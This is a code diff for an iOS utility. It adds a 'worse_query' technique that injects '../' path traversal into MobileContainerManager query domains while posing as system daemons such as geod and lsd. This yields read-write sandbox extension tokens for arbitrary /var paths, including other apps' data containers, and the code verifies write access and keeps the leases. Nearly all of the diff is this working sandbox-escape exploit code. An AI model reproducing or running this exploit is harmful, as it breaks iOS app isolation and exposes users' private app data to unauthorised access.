@@ -93,7 +93,7 @@ typedef struct {
     bool  active;
 } MCMLease;
 
-#define MAX_LEASES 4
+#define MAX_LEASES 8
 static MCMLease sLeases[MAX_LEASES];
 static os_unfair_lock sLeaseLock = OS_UNFAIR_LOCK_INIT;
 
@@ -116,6 +116,108 @@ static MCMLease *allocLease(void) {
 
 static inline void DavizinMCMLog(NSString *msg) {
     NSLog(@"[DavizinMCM] %@", msg);
+}
+
+#pragma mark - Forward declarations
+
+static void _storeLease(MCMAPI *api, void *q, void *act, const char *bid, const char *path);
+static BOOL _mcmProbeCanWrite(const char *dirPath);
+
+#pragma mark - worse_query: scoped MCM partDomain traversal (Filza technique)
+
+static const uint64_t kMCMReadWritePartFlags = 0x8100000000ULL;
+
+typedef struct {
+    uint64_t cls;
+    const char *identifier;
+    bool group;
+    uint64_t part;
+    int depth;
+    const char *label;
+} WQAnchor;
+
+static const WQAnchor kWQAnchors[] = {
+    { 12, "com.apple.geod",                              false, 3, 6, "C12-geod" },
+    { 13, "systemgroup.com.apple.mobilegestaltcache",     true,  3, 6, "C13-gestalt" },
+    { 13, "systemgroup.com.apple.installcoordinationd",   true,  3, 6, "C13-install" },
+    { 12, "com.apple.eligibilityd",                       false, 3, 6, "C12-eligib" },
+    { 13, "systemgroup.com.apple.configurationprofiles",  true,  0, 4, "C13-config" },
+    { 10, "com.apple.swcd",                               false, 0, 4, "C10-swcd" },
+    { 10, "com.apple.lsd",                                false, 0, 4, "C10-lsd" },
+    { 15, "com.apple.appmanagedfeaturesd",                false, 0, 4, "C15-appman" },
+};
+static const int kWQAnchorCount = sizeof(kWQAnchors) / sizeof(kWQAnchors[0]);
+
+static int64_t _worseQueryGrant(const char *targetPath, const char *leaseLabel) {
+    MCMAPI *api = MCMGetAPI();
+    if (!api->queryCreate || !api->querySetPartDomain || !api->queryGetSingle ||
+        !api->objectCopy || !api->objectActivate)
+        return -1;
+
+    const char *relPath = NULL;
+    if (strncmp(targetPath, "/private/var/", 13) == 0)
+        relPath = targetPath + 13;
+    else if (strncmp(targetPath, "/var/", 5) == 0)
+        relPath = targetPath + 5;
+    else
+        return -1;
+
+    for (int i = 0; i < kWQAnchorCount; i++) {
+        const WQAnchor *a = &kWQAnchors[i];
+
+        char domain[2048];
+        domain[0] = '\0';
+        for (int d = 0; d < a->depth; d++) {
+            if (d == 0) strlcat(domain, "..", sizeof(domain));
+            else strlcat(domain, "/..", sizeof(domain));
+        }
+        strlcat(domain, "/", sizeof(domain));
+        strlcat(domain, relPath, sizeof(domain));
+
+        void *q = api->queryCreate();
+        if (!q) continue;
+
+        api->querySetClass(q, a->cls);
+        xpc_object_t xid = xpc_string_create(a->identifier);
+        if (a->group && api->querySetGroupIdentifiers)
+            api->querySetGroupIdentifiers(q, xid);
+        else
+            api->querySetIdentifiers(q, xid);
+        api->querySetFlags(q, kMCMReadWritePartFlags);
+        if (api->querySetPart) api->querySetPart(q, a->part);
+        api->querySetPartDomain(q, domain);
+
+        void *res = api->queryGetSingle(q);
+        if (res) {
+            void *act = api->objectCopy(res);
+            if (act) {
+                char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
+                bool hasToken = token && token[0] != '\0';
+                bool activated = hasToken && api->objectActivate(act, false);
+                free(token);
+
+                int fd = open(targetPath, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
+                if (fd >= 0) {
+                    close(fd);
+                    DavizinMCMLog([NSString stringWithFormat:
+                        @"[WQ] %s tok=%d act=%d → open OK para %s", a->label, hasToken, activated, targetPath]);
+                    _storeLease(api, q, act, leaseLabel ?: a->identifier, targetPath);
+                    xpc_release(xid);
+                    return 9100 + i;
+                }
+                if (api->objectFree) api->objectFree(act);
+            }
+        } else {
+            void *qErr = api->queryGetLastError ? api->queryGetLastError(q) : NULL;
+            int posix = qErr && api->errorGetPOSIX ? api->errorGetPOSIX(qErr) : 0;
+            NSLog(@"[WQ] %s: NULL posix=%d domain=%s", a->label, posix, domain);
+        }
+
+        xpc_release(xid);
+        api->queryFree(q);
+    }
+
+    return -1;
 }
 
 #pragma mark - bad_query grant helpers
@@ -143,6 +245,15 @@ int64_t DavizinGrantContainerAccess(const char *containerPath) {
     }
 
     const char *pathC = [cleanPath UTF8String];
+
+    // Strategy WQ: worse_query — scoped MCM partDomain traversal (primary for iOS 27.2)
+    {
+        int64_t wqHandle = _worseQueryGrant(pathC, "wq-grant");
+        if (wqHandle >= 0) {
+            DavizinMCMLog([NSString stringWithFormat:@"Grant WQ para %@: handle=%lld", cleanPath, wqHandle]);
+            return wqHandle;
+        }
+    }
 
     // Strategy 0: MCM class-7 app group native activation (Filza technique)
     // Activating an app group sandbox extension may grant access to the target path
@@ -725,6 +836,143 @@ DavizinProbeResult DavizinProbeContainerWriteAccess(NSString *containerPath, NSS
         }
     }
 
+    // ── Strategy WQ: worse_query — scoped MCM partDomain traversal ──
+    {
+        _probeDiagAppend("SWQ:wq | ");
+        const char *relPath = NULL;
+        if (strncmp(pathC, "/private/var/", 13) == 0)
+            relPath = pathC + 13;
+        else if (strncmp(pathC, "/var/", 5) == 0)
+            relPath = pathC + 5;
+
+        if (relPath && api->queryCreate && api->querySetPartDomain && api->objectCopy && api->objectActivate) {
+            for (int i = 0; i < kWQAnchorCount; i++) {
+                const WQAnchor *a = &kWQAnchors[i];
+
+                char domain[2048];
+                domain[0] = '\0';
+                for (int d = 0; d < a->depth; d++) {
+                    if (d == 0) strlcat(domain, "..", sizeof(domain));
+                    else strlcat(domain, "/..", sizeof(domain));
+                }
+                strlcat(domain, "/", sizeof(domain));
+                strlcat(domain, relPath, sizeof(domain));
+
+                void *q = api->queryCreate();
+                if (!q) continue;
+
+                api->querySetClass(q, a->cls);
+                xpc_object_t xid = xpc_string_create(a->identifier);
+                if (a->group && api->querySetGroupIdentifiers)
+                    api->querySetGroupIdentifiers(q, xid);
+                else
+                    api->querySetIdentifiers(q, xid);
+                api->querySetFlags(q, kMCMReadWritePartFlags);
+                if (api->querySetPart) api->querySetPart(q, a->part);
+                api->querySetPartDomain(q, domain);
+
+                void *res = api->queryGetSingle(q);
+                if (res) {
+                    void *act = api->objectCopy(res);
+                    if (act) {
+                        char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
+                        bool hasToken = token && token[0] != '\0';
+                        bool activated = hasToken && api->objectActivate(act, false);
+                        free(token);
+                        _probeDiagAppend("WQ[%s]t=%d a=%d ", a->label, hasToken, activated);
+
+                        if (_mcmProbeCanWrite(pathC)) {
+                            result.method = 20 + i; result.handle = 0; result.writeOK = YES;
+                            snprintf(result.detail, sizeof(result.detail),
+                                     "worse_query %s WRITE VERIFIED", a->label);
+                            _probeDiagAppend("*** SUCCESS WQ ***");
+                            _storeLease(api, q, act, bidC, pathC);
+                            xpc_release(xid);
+                            return result;
+                        }
+
+                        int fd = open(pathC, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
+                        if (fd >= 0) {
+                            close(fd);
+                            _probeDiagAppend("WQ[%s]read_ok ", a->label);
+                        }
+
+                        if (api->objectFree) api->objectFree(act);
+                    }
+                } else {
+                    _probeDiagAppend("WQ[%s]=null ", a->label);
+                }
+
+                xpc_release(xid);
+                api->queryFree(q);
+            }
+        }
+    }
+
+    // ── Strategy WQ-parent: worse_query on parent directory ──
+    {
+        const char *parentDir = "/private/var/mobile/Containers/Data/Application";
+        const char *parentRel = "mobile/Containers/Data/Application";
+        _probeDiagAppend("SWQp | ");
+
+        if (api->queryCreate && api->querySetPartDomain && api->objectCopy && api->objectActivate) {
+            for (int i = 0; i < kWQAnchorCount && i < 4; i++) {
+                const WQAnchor *a = &kWQAnchors[i];
+
+                char domain[2048];
+                domain[0] = '\0';
+                for (int d = 0; d < a->depth; d++) {
+                    if (d == 0) strlcat(domain, "..", sizeof(domain));
+                    else strlcat(domain, "/..", sizeof(domain));
+                }
+                strlcat(domain, "/", sizeof(domain));
+                strlcat(domain, parentRel, sizeof(domain));
+
+                void *q = api->queryCreate();
+                if (!q) continue;
+
+                api->querySetClass(q, a->cls);
+                xpc_object_t xid = xpc_string_create(a->identifier);
+                if (a->group && api->querySetGroupIdentifiers)
+                    api->querySetGroupIdentifiers(q, xid);
+                else
+                    api->querySetIdentifiers(q, xid);
+                api->querySetFlags(q, kMCMReadWritePartFlags);
+                if (api->querySetPart) api->querySetPart(q, a->part);
+                api->querySetPartDomain(q, domain);
+
+                void *res = api->queryGetSingle(q);
+                if (res) {
+                    void *act = api->objectCopy(res);
+                    if (act) {
+                        char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
+                        bool hasToken = token && token[0] != '\0';
+                        bool activated = hasToken && api->objectActivate(act, false);
+                        free(token);
+                        _probeDiagAppend("WQp[%s]t=%d a=%d ", a->label, hasToken, activated);
+
+                        if (_mcmProbeCanWrite(pathC)) {
+                            result.method = 30 + i; result.handle = 0; result.writeOK = YES;
+                            snprintf(result.detail, sizeof(result.detail),
+                                     "worse_query parent %s WRITE VERIFIED", a->label);
+                            _probeDiagAppend("*** SUCCESS WQp ***");
+                            _storeLease(api, q, act, "wq-parent", parentDir);
+                            xpc_release(xid);
+                            return result;
+                        }
+
+                        if (api->objectFree) api->objectFree(act);
+                    }
+                } else {
+                    _probeDiagAppend("WQp[%s]=null ", a->label);
+                }
+
+                xpc_release(xid);
+                api->queryFree(q);
+            }
+        }
+    }
+
     // ── Strategy 2: bad_query_probe_write (multi-class/flags brute force) ──
     _probeDiagAppend("S2:bq | ");
     {
@@ -977,6 +1225,15 @@ NSString *DavizinDiscoverContainerPath(NSString *bundleID) {
         "/var/mobile/Containers/Data/Application",
     };
     static const int kDirCount = 2;
+
+    // Pass 0c: worse_query on parent directory to enable scanning
+    {
+        int64_t wqHandle = _worseQueryGrant("/private/var/mobile/Containers/Data/Application", "wq-discover");
+        if (wqHandle >= 0) {
+            DavizinMCMLog([NSString stringWithFormat:
+                @"[Discovery] WQ parent grant OK handle=%lld", wqHandle]);
+        }
+    }
 
     // Pass 1: try without granting (AppDataContainers entitlement might suffice)
     for (int i = 0; i < kDirCount; i++) {
